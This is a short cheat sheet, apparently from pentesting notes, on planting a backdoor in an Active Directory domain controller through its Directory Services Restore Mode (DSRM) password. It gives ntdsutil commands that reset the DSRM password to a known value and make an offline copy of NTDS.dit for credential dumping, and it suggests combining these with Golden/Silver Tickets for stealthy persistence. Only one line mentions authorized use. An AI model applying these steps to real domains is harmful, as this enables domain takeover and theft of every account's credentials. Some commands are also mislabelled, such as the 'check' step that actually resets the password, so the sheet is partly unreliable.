# DSRMBackdoor

**Type:** Active Directory / Domain Controller Persistence
**Focus:** Backdoor access via Directory Services Restore Mode (DSRM)

---

## 1. Full Feature Overview

* Exploits DSRM password to gain DC access
* DSRM is used for AD recovery; bypasses normal authentication
* Allows offline access to AD database (NTDS.dit)
* Can reset or backdoor domain accounts
* Often combined with Silver/Golden Tickets for full AD compromise
* Can be implemented via scripts, Mimikatz, or PowerShell

---

## 2. Requirements & Setup

### Requirements

* Physical or remote admin access to DC
* Knowledge of current DSRM password or ability to reset it
* PowerShell or Mimikatz for scripting

### Installation

* No separate installation required; uses Windows built-in services
* Tools: Mimikatz, PowerView, or custom scripts

---

## 3. Core Usage

### 3.1 Check Current DSRM Password

```powershell
# Using ntdsutil
ntdsutil "set dsrm password" "reset password on server NULL" q q
```

### 3.2 Reset/Backdoor DSRM Password

```powershell
# Set a known password
ntdsutil "set dsrm password" "reset password on server NULL" "newpassword" q q
```

### 3.3 Log into DSRM

```text
# Reboot DC into DSRM and log in with backdoor password
Administrator / newpassword
```

### 3.4 Combine with AD Tools

* Mount NTDS.dit offline for dumping credentials
* Use with Mimikatz to generate tickets

---

## 4. Tips, Tricks, Best Practices

* Always validate access after password reset
* Use only in lab or authorized pen tests; risky on production
* Combine with Golden/Silver Tickets for stealth persistence
* Monitor DSRM logins to detect misuse
* Keep password complexity for lab scenarios

---

## 5. Cheat Sheet

```text
# Reset DSRM password
ntdsutil "set dsrm password" "reset password on server NULL" "newpassword" q q

# Login to DSRM after reboot
Administrator / newpassword

# Offline NTDS dump (optional)
ntdsutil "activate instance ntds" "ifm" "create full C:\ADBackup" q q
```

---
